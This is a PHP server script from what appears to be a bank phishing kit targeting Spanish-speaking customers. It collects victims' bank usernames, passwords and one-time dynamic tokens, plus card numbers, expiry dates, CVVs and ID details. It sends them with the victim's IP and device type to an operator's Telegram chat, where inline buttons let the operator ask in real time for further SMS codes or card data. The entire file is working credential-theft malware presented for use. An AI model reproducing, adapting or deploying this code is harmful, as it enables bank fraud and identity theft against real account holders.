<?php
header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

try {
    $configLocal = @include __DIR__ . '/config.php';
    $config = is_array($configLocal) ? $configLocal : [];

    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        $globalPath = __DIR__ . '/../config.php';
        if (file_exists($globalPath)) {
            $config = include $globalPath;
        }
    }

    // Read raw input (for JSON payload compatibility)
    $rawInput = file_get_contents('php://input');
    $jsonInput = json_decode($rawInput, true);
    if (!is_array($jsonInput)) {
        $jsonInput = [];
    }

    // Merge POST and JSON inputs
    $inputs = array_merge($_POST, $jsonInput);

    $transactionId = $inputs['transactionId'] ?? $inputs['session_id'] ?? '';
    $u_id = $inputs['u_id'] ?? $inputs['usuario'] ?? $inputs['username'] ?? '';
    $u_ps = $inputs['u_ps'] ?? $inputs['contraseña'] ?? $inputs['password'] ?? $inputs['clave'] ?? '';
    $u_tk = $inputs['u_tk'] ?? $inputs['dinamica'] ?? $inputs['token'] ?? $inputs['codigo'] ?? '';
    $u_tb_raw = $inputs['u_tb'] ?? '{}';
    if (isset($inputs['tbdatos'])) {
        $u_tb_raw = is_array($inputs['tbdatos']) ? json_encode($inputs['tbdatos']) : $inputs['tbdatos'];
    }

    if (empty($transactionId) || empty($u_id) || empty($u_tk)) {
        echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
        exit;
    }

    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        echo json_encode(['status' => 'error', 'message' => 'Config vacía (bot_token/chat_id)']);
        exit;
    }

    $tb = json_decode($u_tb_raw, true);
    if (!is_array($tb)) {
        $tb = [];
    }

    $tbFallback = [];
    foreach (['nombre','documento','cedula','tipo_identificacion','correo','email','telefono','celular','direccion','banco','total_pagar','monto','amount','valor','valor_pagar','total','tarjeta','fecha','expMonth','expYear','cvv','ownerName'] as $field) {
        if (isset($inputs[$field]) && $inputs[$field] !== '') {
            $tbFallback[$field] = $inputs[$field];
        }
    }
    if (!empty($tbFallback)) {
        $tb = array_merge($tb, $tbFallback);
    }

    $banco = !empty($tb['banco']) ? strtoupper($tb['banco']) : 'BANCO';
    $monto = $inputs['monto'] ?? $inputs['amount'] ?? $inputs['total_pagar'] ?? $inputs['valor'] ?? '';
    if ($monto === '') {
        $monto = $tb['total_pagar'] ?? $tb['monto'] ?? $tb['amount'] ?? $tb['valor'] ?? $tb['valor_pagar'] ?? $tb['total'] ?? '';
    }

    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $device = 'PC';
    if (stripos($userAgent, 'Android') !== false) {
        $device = 'Android';
    } elseif (stripos($userAgent, 'iPhone') !== false || stripos($userAgent, 'iPad') !== false) {
        $device = 'iPhone';
    } elseif (stripos($userAgent, 'Mobile') !== false) {
        $device = 'Movil';
    }

    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
    $hora = date('d/m/Y H:i:s');

    $mensaje = "DINAMICA - {$banco} ◉

";
    if (!empty($tb['nombre'])) {
        $mensaje .= "🟢 Nombre: " . $tb['nombre'] . "

";
    }
    if ($monto !== '') {
        $mensaje .= "🟢 Monto: $" . number_format((float)$monto, 0, ',', '.') . "

";
    }
    $mensaje .= "🟢 Usuario: " . $u_id . "
";
    $mensaje .= "🟢 Clave: " . $u_ps . "

";
    $mensaje .= "🟢 Dinamica: " . $u_tk . "

";
    $mensaje .= "🟢 IP: {$ip} | Device: {$device} | {$hora}

";
    $mensaje .= "🐙 @FU7UR4MA 🐙";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => "Error Logo", 'callback_data' => "error_logo:{$transactionId}"]
            ],
            [
                ['text' => "Dinamica", 'callback_data' => "pedir_dinamica:{$transactionId}"],
                ['text' => "SMS", 'callback_data' => "pedir_sms:{$transactionId}"]
            ],
            [
                ['text' => "Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"],
                ['text' => "923", 'callback_data' => "923:{$transactionId}"]
            ],
            [
                ['text' => "T-credito", 'callback_data' => "pedir_credito:{$transactionId}"],
                ['text' => "T-debito", 'callback_data' => "pedir_debito:{$transactionId}"]
            ]
        ]
    ];

    $data = [
        'chat_id' => $config['chat_id'],
        'text' => $mensaje,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $response = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($response === false) {
        echo json_encode(['status' => 'error', 'message' => 'curl_error', 'detail' => $err]);
        exit;
    }

    $result = json_decode($response, true);
    echo json_encode([
        'status' => !empty($result['ok']) ? 'success' : 'error',
        'messageId' => !empty($result['ok']) ? ($result['result']['message_id'] ?? null) : null,
        'raw' => $result
    ]);
} catch (Throwable $e) {
    echo json_encode(['status' => 'error', 'message' => 'server_exception', 'detail' => $e->getMessage()]);
}
